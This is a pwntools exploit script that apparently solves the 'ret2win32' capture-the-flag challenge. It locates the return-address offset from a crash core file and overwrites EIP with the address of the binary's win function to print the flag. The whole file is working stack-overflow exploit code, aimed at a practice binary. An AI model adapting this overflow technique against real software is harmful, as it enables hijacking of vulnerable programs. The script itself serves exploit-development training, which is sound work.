#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwntools-pwn template ./ret2win32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ret2win32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

context.log_level ='info'
context.delete_corefiles = True
context.terminal = 'gnome-terminal'

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

# print address to return to
info("%#x target", exe.symbols.ret2win)

# create payload and send
payload = cyclic(100)
io.sendlineafter('>', payload)

# wait for program to crash
io.wait()

# open corefile
core = io.corefile

# get offset after which return address was overwritten
esp_value = core.esp
esp_offset = cyclic_find(esp_value)
info('Located ESP Offset at {a}'.format(a=esp_offset))

eip_value = core.eip
eip_offset = cyclic_find(eip_value)
info('Located EIP offset at {a}'.format(a=eip_offset))

print(core.registers)

payload = flat(
    asm('nop')*eip_offset,
    exe.symbols.ret2win
)

io = start()
io.sendline(payload)
io.recv()


flag = io.recvline()
success(flag)
# io.interactive()
